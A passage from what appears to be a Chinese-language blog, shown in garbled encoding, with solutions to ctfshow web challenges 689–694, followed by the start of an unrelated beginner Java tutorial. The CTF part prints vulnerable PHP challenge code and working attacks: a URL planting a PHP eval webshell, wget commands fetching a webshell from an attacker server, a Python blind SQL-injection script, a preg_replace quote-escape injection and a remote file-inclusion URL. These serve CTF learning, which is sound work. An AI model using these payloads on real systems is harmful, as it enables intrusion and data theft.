<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'..'</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This is a waf!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'http://127.0.0.1/'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"console.log(<span class="token interpolation"><span class="token variable">$path</span></span> update successed!)"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Hello.CTFshow"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>è¿™é‡Œåœ¨pathä½ç½®æ²¡æœ‰è¿‡æ»¤ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸ç®¡æˆ‘ä»¬åœ¨pathä½ç½®å†™å…¥ä»€ä¹ˆéƒ½ä¼šåŸå°ä¸åŠ¨çš„è¿”å›ï¼Œæ‰€ä»¥æ­¤æ—¶æˆ‘ä»¬è®©dockerè®¿é—®è‡ªå·±ï¼Œåœ¨pathå¤„ä¼ å…¥æœ¨é©¬å³å¯</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;f784bf7a-ace9-414a-bbfd-cfd348cefd95.challenge.ctf.show&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;%26path&#x3D;%3C?php%20eval($_POST[1]);?%3E&amp;path&#x3D;b.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>690</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$args</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^\w+$/'</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sorry"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">exec</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'./ '</span> <span class="token operator">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">" "</span><span class="token punctuation">,</span> <span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¼ å…¥çš„å‘½ä»¤ä¸­åªèƒ½æœ‰å­—æ¯å’Œæ•°å­—ï¼Œæ‰§è¡Œå‘½ä»¤å¯ç”¨æ¢è¡Œç»•è¿‡ï¼Œé—®é¢˜æ˜¯æˆ‘ä»¬è¦å¦‚ä½•æ„é€ å‘½ä»¤æ¥æ‰§è¡Œï¼Œé¦–å…ˆå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œæ˜¯è¡Œä¸é€šçš„ï¼Œé‚£å¯ä»¥å°è¯•å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œæ„é€ ä¸€ä¸ªæœåŠ¡å™¨è¿”å›å†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬çš„è„šæœ¬</p>
<pre class="line-numbers language-none"><code class="language-none">
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ„é€ å¦‚ä¸‹å‘½ä»¤</p>
<pre class="line-numbers language-none"><code class="language-none">mkdir a
cd a
wget 10è¿›åˆ¶æœåŠ¡å™¨IP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>æ­¤æ—¶aæ–‡ä»¶å¤¹ä¸‹å°±æœ‰ä¸€ä¸ªindex.htmlå†…å®¹ä¸ºä¸€å¥è¯æœ¨é©¬ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ²¡åŠæ³•æ‰§è¡Œï¼Œæ­¤æ—¶æˆ‘ä»¬åˆ©ç”¨taræ¥å°†æ–‡ä»¶ç±»å‹è¿›è¡Œæ›´æ”¹</p>
<pre class="line-numbers language-none"><code class="language-none">tar cvf shell a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°†aæ–‡ä»¶å¤¹æ‰“åŒ…æˆä¸€ä¸ªshellæ–‡ä»¶å°±å¯ä»¥æ‰§è¡Œäº†</p>
<p><strong>691</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'inc.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span>   <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
      <span class="token variable">$filterlist</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/\(|\)|username|password|where|
      case|when|like|regexp|into|limit|=|for|;/"</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$filterlist</span><span class="token punctuation">,</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"illegal input!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span>
<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input username!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span>
<span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"please input password!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from admin where  username =
 '<span class="token interpolation"><span class="token variable">$username</span></span>' and password = '<span class="token interpolation"><span class="token variable">$password</span></span>' "</span><span class="token punctuation">;</span>
<span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$conn</span> <span class="token operator">-></span> <span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$res</span> <span class="token operator">-></span> <span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">echo</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
   <span class="token keyword">echo</span> <span class="token string double-quoted-string">"The content in the password column is the flag!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>order byç›²æ³¨ï¼Œè´´ä¸ª<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/104908543" >é“¾æ¥</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼ŒåŸç†å°±æ˜¯é€šè¿‡passwordä½ç½®çš„å­—ç¬¦ä¸²çš„æ¯”è¾ƒå¯¼è‡´å›æ˜¾ä¸­usernameçš„å†…å®¹ä¸åŒæ¥åˆ¤æ–­ç»“æœï¼Œç›´æ¥å†™è„šæœ¬å§</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
flagstr<span class="token operator">=</span><span class="token string">"-01234567890abcdefghiostw&#123;&#125;---"</span>
url<span class="token operator">=</span><span class="token string">"http://9446af78-f5bd-4d30-94b4-05dc5eb8f887.challenge.ctf.show/"</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>flagstr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        tmp<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token punctuation">]</span>
        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span><span class="token string-interpolation"><span class="token string">f"'or 1 union select 1,2,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">' order by 3#"</span></span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">&#125;</span>
        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"&lt;/code>admin"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            flag<span class="token operator">=</span>flag<span class="token operator">+</span>flagstr<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>692</strong></p>
<p>çœ‹ä¸€ä¸‹preg_replaceå‡½æ•°çš„ç”¨æ³•</p>
<blockquote>

        <h1 id="preg-replace"   >
          <a href="#preg-replace" class="heading-link"><i class="fas fa-link"></i></a><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h1>
      <p>(PHP 4, PHP 5, PHP 7, PHP 8)</p>
<p>preg_replace â€” æ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢å’Œæ›¿æ¢</p>

        <h3 id="è¯´æ˜"   >
          <a href="#è¯´æ˜" class="heading-link"><i class="fas fa-link"></i></a><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3>
      <pre class="line-numbers language-none"><code class="language-none">preg_replace(
  string|array $pattern,
  string|array $replacement,
  string|array $subject,
  int $limit &#x3D; -1,
  int &amp;$count &#x3D; null
): string|array|null<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœç´¢ <code>subject</code> ä¸­åŒ¹é… <code>pattern</code> çš„éƒ¨åˆ†ï¼Œä»¥ <code>replacement</code> è¿›è¡Œæ›¿æ¢ã€‚</p>
<pre class="line-numbers language-none"><code class="language-none">replacement<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç”¨äºæ›¿æ¢çš„å­—ç¬¦ä¸²æˆ–å­—ç¬¦ä¸²æ•°ç»„ã€‚å¦‚æœè¿™ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶ä¸” <code>pattern</code> æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„æ¨¡å¼éƒ½ä½¿ç”¨è¿™ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ <code>pattern</code> å’Œ <code>replacement</code> éƒ½æ˜¯æ•°ç»„ï¼Œæ¯ä¸ª <code>pattern</code> ä½¿ç”¨ <code>replacement</code>ä¸­å¯¹åº”çš„å…ƒç´ è¿›è¡Œæ›¿æ¢ã€‚å¦‚æœ <code>replacement</code> ä¸­çš„å…ƒç´ æ¯” <code>pattern</code> ä¸­çš„å°‘ï¼Œå¤šå‡ºæ¥çš„ <code>pattern</code> ä½¿ç”¨ç©ºå­—ç¬¦ä¸²è¿›è¡Œæ›¿æ¢ã€‚</p>
<p><code>replacement</code> ä¸­å¯ä»¥åŒ…å«åå‘å¼•ç”¨ <code>\\n</code> æˆ– <code>$n</code>ï¼Œè¯­æ³•ä¸Šé¦–é€‰åè€…ã€‚ æ¯ä¸ªè¿™æ ·çš„å¼•ç”¨å°†è¢«åŒ¹é…åˆ°çš„ç¬¬ n ä¸ªæ•è·å­ç»„æ•è·åˆ°çš„æ–‡æœ¬æ›¿æ¢ã€‚ n å¯ä»¥æ˜¯0-99ï¼Œ<code>\\0</code> å’Œ <code>$0</code> ä»£è¡¨å®Œæ•´çš„æ¨¡å¼åŒ¹é…æ–‡æœ¬ã€‚æ•è·å­ç»„çš„åºå·è®¡æ•°æ–¹å¼ä¸ºï¼šä»£è¡¨æ•è·å­ç»„çš„å·¦æ‹¬å·ä»å·¦åˆ°å³ï¼Œ ä»1å¼€å§‹æ•°ã€‚å¦‚æœè¦åœ¨ <code>replacement</code> ä¸­ä½¿ç”¨åæ–œçº¿ï¼Œå¿…é¡»ä½¿ç”¨ 4 ä¸ª(<code>&quot;\\\\&quot;</code>ï¼Œè¯‘æ³¨ï¼šå› ä¸ºè¿™é¦–å…ˆæ˜¯ PHP çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è½¬ä¹‰åï¼Œæ˜¯ä¸¤ä¸ªï¼Œå†ç»è¿‡æ­£åˆ™è¡¨è¾¾å¼å¼•æ“åæ‰è¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªåŸæ–‡åæ–œçº¿)ã€‚</p>
</blockquote>
<p>æ­¤å¤„å¦‚æœå°†replacementä¸­å†…å®¹æ”¾å…¥<code>\\0</code>é‚£ä¹ˆå°±ä¼šç›´æ¥åŒ¹é…å‰é¢patternä¸­çš„ç»“æœ</p>
<blockquote>
<p>preg_replaceä¸­çš„ç¬¬äºŒä¸ªå‚æ•°å¦‚æœæ˜¯%00ä¹Ÿå°±æ˜¯asciiä¸­çš„0,é‚£ä¹ˆå°†ä¼šåŒ¹é…åˆ°æ•´ä¸ªå­—ç¬¦ä¸²ã€‚<br>æ¯”å¦‚åˆå§‹çš„å­—ç¬¦ä¸²ä¸º<br>$option=â€™123â€™;<br>å¦‚æœæ‰§è¡Œ<br>preg_replace(â€œ$option=â€™.*â€™;â€,â€\x00â€,$a)<br>é‚£ä¹ˆè¿”å›çš„ç»“æœæ˜¯<br>$option=â€™$option=â€™123â€™;â€™;<br>å…¶å®å°±æ˜¯æŠŠåŸæ¥çš„å­—ç¬¦ä¸²åˆæ”¾åˆ°å•å¼•å·é‡Œé¢äº†ã€‚<br>å‡è®¾æˆ‘ä»¬ç¬¬ä¸€æ¬¡ä¼ option=;phpinfo();//<br>é¦–å…ˆconfig.phpä¸­çš„å†…å®¹ä¼šè¢«æ›¿æ¢æˆ$option=â€™;phpinfo();//â€˜ã€‚<br>å¦‚æœæˆ‘ä»¬ç¬¬äºŒæ¬¡ä¼ option=%00<br>é‚£ä¹ˆæœ€ç»ˆçš„ç»“æœæ˜¯$option=â€™$option=â€™;phpinfo();//â€˜â€™<br>è¿™æ ·å°±é€ƒå‡ºäº†å•å¼•å·ï¼Œphpinfo()ä¹Ÿå°±æ‰§è¡ŒæˆåŠŸ<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”<br>ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€Œyu22xã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚<br>åŸæ–‡é“¾æ¥ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/122998220" >https://blog.csdn.net/miuzzx/article/details/122998220</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
</blockquote>
<p><strong>693</strong></p>
<p>extractå‡½æ•°åŠ è¿œç¨‹æ–‡ä»¶åŒ…å«</p>
<pre class="line-numbers language-none"><code class="language-none">?function&#x3D;extract&amp;file&#x3D;http:&#x2F;&#x2F;45.15.131.101&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><strong>694</strong></p>
<p>æ„é€ X-Forwarded-Forè¯·æ±‚å¤´ä¸ºæ–‡ä»¶åï¼Œfileä¸º.å³å¯ç›´æ¥å†™å…¥åˆ°è¯·æ±‚å¤´æ‰€æ„é€ çš„æ–‡ä»¶åä¸­</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;var&#x2F;www&#x2F;html&#x2F;a.php&#x2F;.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>695</p>
<script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css"></div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/posts/63f03572.html">Javaå…¥é—¨</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">å‘è¡¨äº</span><span class="post-meta-item__value">2022-06-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">æ›´æ–°äº</span><span class="post-meta-item__value">2022-07-08</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/63f03572.html" data-flag-title="Javaå…¥é—¨"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="JAVA"   >
          <a href="#JAVA" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h1>
      <p><strong>Hello World!</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//Main.java</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Hello world!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//javac Main.java</span>
<span class="token comment">//java Main</span>
<span class="token comment">//JDK 11ä»¥åæ”¯æŒç›´æ¥ä½¿ç”¨javaæ‰§è¡Œæºä»£ç </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>JDKï¼ˆJavaå¼€å‘å·¥å…·åŒ…ï¼‰ç»„æˆ</strong></p>
<ul>
<li>JVMï¼šJavaè™šæ‹Ÿæœºï¼Œjavaç¨‹åºè¿è¡Œçš„åœ°æ–¹</li>
<li>æ ¸å¿ƒç±»åº“ï¼šJavaè‡ªå¸¦ç±»ï¼Œä¾›ç¨‹åºå‘˜è°ƒç”¨</li>
<li>JREï¼šJavaè¿è¡Œç¯å¢ƒ</li>
</ul>
<p><strong>æ•°æ®ç±»å‹</strong></p>
<p>åŸºæœ¬æ•°æ®ç±»å‹</p>
<ul>
<li>æ•´æ•°<ul>
<li>byte    1å­—èŠ‚</li>
<li>short    2å­—èŠ‚</li>
<li>intï¼ˆé»˜è®¤ï¼‰    4å­—èŠ‚</li>
<li>long    8å­—èŠ‚ï¼ˆæ•´æ•°å®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Lï¼‰</li>
</ul>
</li>
<li>æµ®ç‚¹æ•°<ul>
<li>float    4å­—èŠ‚ï¼ˆå®šä¹‰æ—¶éœ€è¦åœ¨æ•°å­—æœ«å°¾åŠ Fï¼‰</li>
<li>doubleï¼ˆé»˜è®¤ï¼‰    8å­—èŠ‚</li>
</ul>
</li>
<li>å­—ç¬¦ï¼šchar 2å­—èŠ‚</li>
<li>å¸ƒå°”ï¼šboolen</li>
</ul>
<p>å¼•ç”¨æ•°æ®ç±»å‹</p>
<p><strong>ç±»å‹è½¬æ¢</strong></p>
<p>é»˜è®¤ç±»å‹è½¬æ¢ï¼Œå°çš„è‡ªåŠ¨æ¢æˆå¤§çš„</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">byte</span> a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">byte</span> b<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token keyword">byte</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„ç¨‹åºæŠ¥é”™ï¼Œå› ä¸ºabåœ¨è¿›è¡ŒåŠ è¿ç®—å‰å·²ç»æ‰§è¡Œè¢«è½¬æ¢æˆintç±»å‹</span>
<span class="token keyword">int</span> c<span class="token operator">=</span>a<span class="token operator">+</span>b<span class="token punctuation">;</span><span class="token comment">//æ­¤å¤„æ­£ç¡®</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>è¿ç®—ç¬¦</strong></p>
<p>å’ŒC++ä¸€æ ·ï¼Œå­—ç¬¦ä¸²çš„ä¼˜å…ˆçº§æ‹‰æ»¡</p>
<p><strong>JavaåŸç”ŸAPI</strong></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase-jdk17-doc-downloads.html" >å®˜æ–¹æ–‡æ¡£</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>Javaç”¨æˆ·è¾“å…¥ï¼ˆç»ƒä¹ ç³»ç»ŸAPIä½¿ç”¨ï¼‰</strong></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span><span class="token comment">//å¯¼å…¥ScanneråŒ…</span>
<span class="token keyword">public</span> <span class="token keyword">class</span> scannerDemo <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">Scanner</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//åˆ›å»ºä¸€ä¸ªScannerå¯¹è±¡</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥æ‚¨çš„å¹´é¾„ï¼š"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> age<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//è·å–Scannerå¾—åˆ°çš„å†…å®¹</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"æ‚¨çš„å¹´é¾„æ˜¯ï¼š"</span><span class="token operator">+</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>ç¨‹åºæµç¨‹æ§åˆ¶</strong></p>
